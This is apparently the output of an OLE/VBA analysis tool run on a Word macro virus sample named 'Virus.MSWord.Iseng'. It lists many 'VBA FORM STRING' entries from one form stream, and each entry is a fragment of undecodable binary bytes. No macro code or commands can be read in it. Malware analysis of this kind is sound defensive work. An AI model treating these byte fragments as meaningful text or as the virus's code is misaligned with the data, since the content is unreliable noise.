VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_��E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�D��܁�ը��.��$�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��a^8&�M��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pХ��<�ɝ�gN
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�d�{�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ᓀ�)^r-�8)��,�\�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��kv�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&*X����h&w�`��X
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�*$��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{��,���s���P��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`'"
"�h��l���h�k߸�03���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�Ȥj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8l6�h�ixJ�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}i3�0��(? �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
51�\F�#x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mn		atgh{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y|}��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�x��ih
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���il
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{ywj~������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w�|~����˺zςk��/�ԩŏ�}Ⳅ���z
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9o�l=
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P5¶�]�x��-�GnY�Sv(��(+
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y	�����p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f� 2�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5��� �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rU;m�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t'O�@=�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9��Ť�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|�4�<1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5c6��D��]Ɏa5��hv��X���۹��3�`�fJ���+>h��ƩB5�~������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ӷo=q
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 r#Xn�S
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{Ͱ�@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c�m
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0p�Il
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.��l'O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�~Ҽ}���c
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`R�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʵ�\t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ןpU�7ނ����r�A'���� �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7@e
h���e
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pnp�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�'�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��|*r��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@"{͝x#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I���7]�+�ǣx1ngJ�4:
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�ӕ����1�b�]
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ҧ�t[n��s�8��tb	�p
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	���@&�g޹��{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>z%�O
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~Dd�t∦�x2�۩�Q'�r�U	i�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�
uʟ�nJk�1�)G
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�|��J���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J+�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��R�-�\lKn
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`'"
"�h��l���h�k߸�03���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�Ȥj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8l6�h�ixJ�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}i3�0��(�!�HDB�$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b$��@�%��d�._�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kxnp\sg
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i{ykj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���mn*
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tvwx�j}��u�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������z�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������î���{
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ehi�{Ҭ����؋��x6���w����հ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����0�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�Ț1G�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
qzAO��{��h���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dxk6Q4��ܹ|
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��irQ�N9�%5R��Of,d

-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���L�T�RhC�-�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�E͋8�5����=/
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
);K�-��
�&d`�]�z�P��hq2�:�m�d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�E(-��d�-\��0 x��M;�(*:p�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bo8`��i�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

��L8s�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<!�Ķs�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ϳC'p�7n��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�|���ڵ�{2;}�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ���N
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`ןv�=1
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y�x�o���s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^t��G�y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��u8!
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ܝ@��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���'F8�s
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ą�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8#
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
귡���xސ�P��!�#�>�7�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y#q9��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yL��^�P��ߔd&�"�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l_�'JaG
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�h6�a
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���o�)\�V�٣�vr�$�{�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p����9���E��.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�(�Z��}:��騵E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i����Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FE���l�b<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N��.
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`'"
"�h��l���h�k߸�03���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(�Ȥj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8l6�h�ixJ�?�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}i3�0��(��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$B�$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� ��NG$��>�pT2
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mpXstvwzzi
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���n�?
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����y�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������x��6̹���������y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��f���Ք��ٙ��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ҔB����Vzb
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7,�?]u�E�Wnս<�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z��Ni�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'x{Gj�I`�*]Ĩ�%�j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Qx!�L@�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}	̩�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˧�^Z�I�f�5�$Fb�r"�����l������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
eʄ-��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�k����<�X�k+�`_q��S�P
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�>�Z�-B�
�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ˀ���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Iseng' - OLE stream: 'Macros/Isengf/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�/4�[+�
